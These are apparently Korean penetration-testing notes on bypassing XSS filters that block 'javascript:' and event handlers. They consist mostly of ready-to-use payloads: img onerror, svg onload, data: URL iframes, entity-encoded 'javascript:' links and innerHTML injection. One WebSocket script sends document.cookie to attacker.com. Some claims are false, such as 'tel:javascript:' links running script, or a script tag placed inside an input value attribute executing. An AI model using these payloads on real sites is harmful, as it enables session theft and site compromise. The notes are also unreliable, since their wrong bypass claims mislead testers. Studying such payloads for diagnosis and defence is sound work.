## 📎**XSS 필터링 우회**와 **스크립트 실행**을 방지하기 위해 활용할 수 있는 **대체 공격 기법**

\*\*`javascript:`\*\*와 **이벤트 핸들러**가 \*\*`void`\*\*로 자동 변환되고 필터링되는 상황에서 **추가적으로 취약한 공격 구문**을 진단하려면, **자바스크립트**를 직접 실행할 수 있는 다른 우회 방법을 찾아야 함. 이미 **`javascript:`** 프로토콜이 차단된 상태라면, 공격자는 **HTML 요소**, **이벤트 핸들러**, 또는 **웹 기술**을 우회할 수 있는 방법을 찾아야 함.


### 1. **DOM 요소에 대한 공격 (이미지, SVG, IFRAME 등)**

브라우저에서 \*\*`javascript:`\*\*를 필터링하는 경우에도, **HTML 요소**에 내장된 **이벤트 핸들러**나 **태그 속성**을 통해 **자바스크립트 실행**을 유도할 수 있습니다.

#### 예시 공격 코드:

* **`<img>` 태그의 `onerror` 이벤트 활용**: 이미지를 불러오지 못할 경우 **`onerror`** 이벤트를 통해 자바스크립트를 실행할 수 있습니다.

```html
<img src="invalid-image" onerror="alert('XSS - img onerror')">
```

* **`<svg>` 태그 활용**: **SVG** 내에서도 \*\*`onload`\*\*나 **`onerror`** 등의 이벤트를 사용해 XSS를 유발할 수 있습니다.

```html
<svg onload="alert('XSS - SVG')">
    <rect width="100" height="100" style="fill:blue"/>
</svg>
```

* **`<iframe>` 태그 활용**: \*\*`iframe`\*\*을 사용하여 **스크립트 실행**을 유도할 수 있습니다.

```html
<iframe src="javascript:alert('XSS - iframe')"></iframe>
```

### 2. **`data:` URL을 통한 공격**

브라우저가 **자바스크립트**를 처리하지 않도록 필터링하는 상황에서도, **`data:`** URL을 이용해 **이미지**나 **스크립트**를 **inline으로 삽입**할 수 있습니다.

#### 예시 공격 코드:

* **`data:` URL을 통해 악성 스크립트 삽입**:

```html
<img src="data:image/svg+xml,<svg onload=alert('XSS')></svg>">
```

이 코드에서는 **`data:`** URL을 사용하여 **SVG 이미지** 내에서 **`onload`** 이벤트를 트리거하여 자바스크립트가 실행됩니다.




## 🔐**`data:` URL을 통한 공격** 


`data:` URL은 URI 스킴의 일종으로, 외부 리소스를 요청하지 않고 **데이터 자체를 URI 안에 포함**시켜 브라우저가 이를 직접 렌더링하거나 실행하게 만드는 방식입니다.

```
data:[<MIME-type>][;base64],<data>
```

예시:

```html
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUg...">
<script src="data:text/javascript,alert('XSS')"></script>
```



---

## 💣 공격 시나리오

### 🔓 예: 필터 우회

1. 어떤 웹 애플리케이션이 사용자의 입력에서 `<script>` 태그나 `javascript:` 스킴을 필터링합니다.
2. 하지만 `data:` 스킴은 허용되어 있어서, 다음과 같은 입력을 삽입할 수 있습니다:

```html
<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
```

3. 브라우저는 이걸 마치 하나의 **자체 HTML 문서**처럼 렌더링하면서, `<script>` 안의 코드가 실행됨

---

## 🎯 공격 유형 정리

| 공격 유형                          | 설명                                                                  |
| ------------------------------ | ------------------------------------------------------------------- |
| **XSS (Cross-Site Scripting)** | `data:text/html`, `data:text/javascript` 등을 이용해 브라우저가 스크립트를 실행하게 만듦 |
| **CSP 우회**                     | CSP에서 외부 자원 로딩을 막았더라도, `data:` URL은 inline처럼 작동하기 때문에 우회 가능         |
| **Phishing/Clickjacking**      | `data:image/svg+xml` 같은 걸 이용해서 눈에 보이지 않는 UI 삽입 가능                   |
| **HTML Injection**             | `<iframe src="data:text/html,...">` 형태로 다른 사용자에게 공격 전달 가능           |




---

### 3. **특수 프로토콜 사용**

**`javascript:`** 외에도, 다른 프로토콜을 활용한 **우회**가 가능합니다. 예를 들어, **`tel:`**, **`file:`**, \*\*`data:`\*\*와 같은 **다른 프로토콜**을 사용하여 **자바스크립트**를 실행하거나 **악성 행위**를 유도할 수 있습니다.

#### 예시 공격 코드:

* **`tel:` 프로토콜을 통한 XSS 우회**:

  * 일부 브라우저에서는 **`tel:`** 프로토콜을 사용할 수 있습니다(TEL URI 스킴(tel:)). 이를 통해 **자바스크립트 코드**가 실행되도록 할 수 있습니다.

  ```html
  <a href="tel:javascript:alert('XSS')">Click me</a>
  ```

* **`data:` 프로토콜을 통한 스크립트 실행 (상동)**:

  * **`data:`** 프로토콜을 사용하여 \*\*`alert()`\*\*이나 **스크립트**를 실행할 수 있습니다.

  ```html
  <a href="data:text/html,<script>alert('XSS')</script>">Click me</a>
  ```

### 4. **폼 필드를 통한 악성 스크립트 삽입**

**폼 필드**나 **입력 필드**에 악성 코드를 삽입하는 방법도 있습니다. 사용자가 입력한 값이 **DOM**에 삽입되면 **XSS** 공격이 발생할 수 있습니다.

#### 예시 공격 코드:

* **`<form>` 입력 필드 활용**:

  * 사용자가 입력한 값에 **악성 스크립트**를 삽입하고, 서버에서 이를 **DOM에 반영**할 때 **XSS**를 유발할 수 있습니다.

  ```html
  <form action="search">
      <input type="text" name="q" value="<script>alert('XSS')</script>">
      <button type="submit">Search</button>
  </form>
  ```

### 5. **DOM 삽입 공격 (innerHTML, eval 등)**

`innerHTML`이나 \*\*`eval`\*\*과 같은 JavaScript 메서드를 사용할 때, 악성 코드가 **DOM에 삽입**될 수 있습니다. 이러한 방법은 **자바스크립트 코드**를 실행시키는 방식으로 **XSS**를 유발할 수 있습니다.

#### 예시 공격 코드:

* **`innerHTML`을 통한 DOM 조작**:

  * 악성 스크립트를 \*\*`innerHTML`\*\*을 통해 **DOM에 삽입**할 수 있습니다.

  ```html
  <div id="target"></div>
  <script>
      document.getElementById('target').innerHTML = '<img src="invalid" onerror="alert(\'XSS\')">';
  </script>
  ```

### 6. **DOM 이벤트 우회 (예: `onclick` 등)**

**`javascript:`** 구문이 필터링되어도 \*\*`onclick`\*\*과 같은 **이벤트 핸들러**를 사용하여 자바스크립트를 실행할 수 있습니다. 특히 **`<a>`**, **`<button>`** 등의 **HTML 요소**에 **이벤트 핸들러**를 추가하여 스크립트를 실행할 수 있습니다.

#### 예시 공격 코드:

* **`onclick` 이벤트 핸들러 사용**:

  * **`<a>`** 태그나 **`<button>`** 등에 **`onclick`** 이벤트를 삽입하여 스크립트를 실행할 수 있습니다.

  ```html
  <a onclick="alert('XSS')">Click me</a>
  ```

  * **`<button>` 사용**:

  ```html
  <button onclick="alert('XSS')">Click me</button>
  ```

### 7. **WebSocket을 이용한 정보 유출**

WebSocket을 활용하여 **클라이언트-서버** 간의 실시간 통신을 **악용**할 수 있습니다. WebSocket은 **XSS 우회** 기법으로 사용할 수 있습니다.

#### 예시 공격 코드:

* **WebSocket을 통한 정보 유출**:

  * 악성 코드를 삽입하여 **WebSocket**을 통해 **민감한 정보**를 외부 서버로 유출할 수 있습니다.

  ```html
  <script>
      var ws = new WebSocket('ws://attacker.com/socket');
      ws.onopen = function() { ws.send(document.cookie); };
  </script>
  ```

---

## 공격 예시
 **HTML 엔티티 인코딩(HTML Entity Encoding)** 또는 **입력값 필터링** 문제로, 주어진 코드에서 `<a href="javascript:alert('23')">Click me</a>`와 같은 태그가 그대로 HTML에 반영되는 대신, HTML 특수 문자가 엔티티 형식으로 변환되어 `<input>` 요소의 `value` 속성에 삽입되는 경우입니다. 

  ```html
  <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">Click me</a>
  ```

\*\*`<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">Click me</a>`\*\*에서 \*\*"Click me"\*\*라는 텍스트를 클릭했을 때 **알림창**이 뜨는 원리는 다음과 같습니다.

### 1. **HTML 코드 분석**

이 코드는 \*\*HTML 앵커 태그 (`<a>`)\*\*를 사용하여 링크를 만들고 있습니다. 그런데 **`href` 속성**에 **`javascript:`** 프로토콜이 포함되어 있습니다. 이때 중요한 점은 **`href` 속성에 자바스크립트 코드**가 들어있다는 것입니다.

* **`href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)"`** 부분은 **HTML 엔티티**로 인코딩된 **`javascript:`** 프로토콜입니다.
* `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;`는 **ASCII 코드로 인코딩된 `javascript:`** 입니다.

  * 디코딩하면 \*\*`javascript:`\*\*가 됩니다.

즉, 이 코드는 `href="javascript:alert(1)"`와 동일한 역할을 합니다.

### 2. **`<a>` 태그의 기본 동작**

**`<a>` 태그**는 **링크**를 만드는 역할을 합니다. 보통 **`href` 속성**에 URL을 넣어서 링크를 정의하지만, 이 경우 **`javascript:`** 프로토콜을 사용하여 **자바스크립트 코드를 실행**하는 링크로 만들어집니다.

* \*\*`href="javascript:alert(1)"`\*\*는 **자바스크립트 코드를 실행**하는 링크입니다.
* 이 링크를 클릭하면 \*\*`alert(1)`\*\*이 실행되므로 **알림창**이 뜨게 됩니다.

### 3. **자바스크립트 `javascript:` 프로토콜**

* \*\*`javascript:`\*\*는 특별한 **프로토콜**입니다. 일반적으로 **URL**을 통해 다른 페이지로 이동하거나 자원을 로드하지만, **`javascript:`** 프로토콜을 사용하면 **자바스크립트 코드**를 실행할 수 있습니다.
* \*\*`javascript:`\*\*로 시작하는 링크는 **자바스크립트 코드**가 바로 실행되도록 합니다. 이 코드에서는 \*\*`alert(1)`\*\*을 실행하여 알림창을 띄웁니다.

### 4. **HTML 엔티티와 자바스크립트 실행**

* `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;`는 \*\*`javascript:`\*\*를 **HTML 엔티티**로 인코딩한 것입니다. 이는 보안 필터나 XSS 방어를 우회하기 위한 기법일 수 있습니다.
* 브라우저에서 이 **HTML 엔티티**를 **디코딩**하여 **`javascript:`** 프로토콜로 해석하고, 해당 자바스크립트 코드가 실행됩니다.

### 5. **"Click me" 텍스트**

* \*\*`<a href="javascript:alert(1)">Click me</a>`\*\*에서 \*\*"Click me"\*\*는 단순히 링크의 **텍스트**입니다.
* 사용자가 \*\*"Click me"\*\*라는 텍스트를 클릭하면 **`href="javascript:alert(1)"`** 속성에 정의된 자바스크립트 코드가 실행되며, **알림창**이 뜨게 됩니다.

### 6. **클릭 시 발생하는 일**

* 사용자가 **"Click me"** 텍스트를 클릭하면, \*\*`href="javascript:alert(1)"`\*\*가 실행됩니다.
* **자바스크립트 `alert(1)`** 코드가 실행되어 **알림창**이 뜨는 것입니다.


\*\*"Click me"\*\*를 클릭하는 순간, **`<a>` 태그의 `href` 속성**에 정의된 **`javascript:alert(1)`** 코드가 실행되어, **알림창**이 뜨게 되는 원리입니다.

---

### 문제 분석

1. **엔티티 변환 문제**:

   * HTML에서 `<`, `>`, `"` 같은 특수 문자는 직접 사용될 경우 HTML 구문에서 문제가 생길 수 있습니다. 그래서 `<a href="javascript:alert('23')">Click me</a>`와 같은 구문은 자동으로 `&lt;a href="javascript:alert('23')">Click me&lt;/a>`와 같이 변환됩니다. 이것은 HTML이 태그로 해석되지 않고 텍스트로 그대로 표시되도록 하는 안전장치입니다.
2. **HTML 특수 문자 처리**:

   * `value="&lt;a href=" void:alert('23')">"Click me">"`처럼 특수 문자들이 엔티티로 변환된 이유는 **입력값을 필터링/변환하는 처리**가 있을 때 발생할 수 있습니다. 이 경우 입력값을 **자동으로 필터링하여 특수 문자를 엔티티로 인코딩**하여 반영하게 됩니다.
3. **`javascript:` 프로토콜 차단**:

   * 이 문제에서는 `href="javascript:alert('23')"`가 제대로 작동하지 않는데, `javascript:` 프로토콜이 CSP(Content Security Policy)나 필터링에서 차단되었을 가능성이 높습니다.

---

### 취약점 진단 방법

1. **`value` 속성에 삽입된 사용자 입력값 확인**:

   * `value` 속성에 삽입된 값이 필터링되지 않거나 **DOM 조작을 통해 삽입된 데이터**가 제대로 처리되지 않으면, 클라이언트 사이드에서 **XSS가 발생할 수 있습니다**. 예를 들어, `document.getElementById('SearchWord').value`를 사용하여 이 값을 DOM에 반영하는 코드가 있을 수 있습니다.

2. **입력값이 HTML로 삽입되는지 테스트**:

   * 만약 `input` 값이 페이지에 표시될 때 자바스크립트 코드가 실행된다면, **DOM 기반 XSS**가 발생할 수 있습니다. 자바스크립트나 이벤트 핸들러가 **동적으로 삽입되는 방식**으로 처리되면 악성 코드가 실행될 수 있습니다.

3. **`<input>` 요소의 값을 사용하여 동적 HTML 생성**:

   * `value` 속성의 입력값을 **`innerHTML`** 또는 **`document.write()`** 등의 메서드를 사용하여 HTML로 삽입하는 경우 XSS가 발생할 수 있습니다. 예를 들어:

     ```javascript
     let inputValue = document.getElementById('SearchWord').value;
     document.getElementById('output').innerHTML = inputValue;
     ```

     위 코드처럼 `input` 값을 직접 `innerHTML`로 삽입하면, 악성 JavaScript 코드도 실행될 수 있습니다.

---     

### 취약점 우회 방법 및 테스트

1. **HTML 엔티티 인코딩 우회**:

   * 만약 `javascript:` 프로토콜이 차단된 경우, **HTML 엔티티**로 우회할 수 있습니다. 예를 들어:

     ```html
     <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">Click me</a>
     ```

     이처럼 `javascript:`를 HTML 문자 코드로 바꾸어 우회할 수 있습니다.

2. **DOM Based XSS**:

   * 만약 입력값이 **DOM을 통해 삽입**될 때 필터링이 제대로 되지 않으면, XSS를 발생시킬 수 있습니다. 예를 들어:

     ```javascript
     let inputValue = document.getElementById('SearchWord').value;
     document.getElementById('output').innerHTML = inputValue;
     ```

     위 코드에서는 `<input>`의 `value` 속성값이 **HTML로 삽입**되기 때문에 **XSS**가 발생할 수 있습니다.

3. **자바스크립트와 HTML의 결합**:

   * `input` 요소의 `value`에 `javascript:` 프로토콜을 포함시키는 것 외에도, 다른 방식으로 **자바스크립트 코드를 실행**할 수 있는 우회 방법을 찾을 수 있습니다. 예를 들어:

     ```html
     <input type="text" id="SearchWord" value="<script>alert('XSS')</script>">
     ```

     또는 **자바스크립트 코드**를 **URL 인코딩**하여 입력할 수도 있습니다.

4. **이벤트 핸들러 조작**:

   * **`onfocus`**, **`onblur`** 등과 같은 HTML 이벤트 핸들러를 사용하여 입력값을 실행할 수 있습니다. 예를 들어:

     ```html
     <input type="text" id="SearchWord" value="<input onfocus=alert(1)>">
     ```
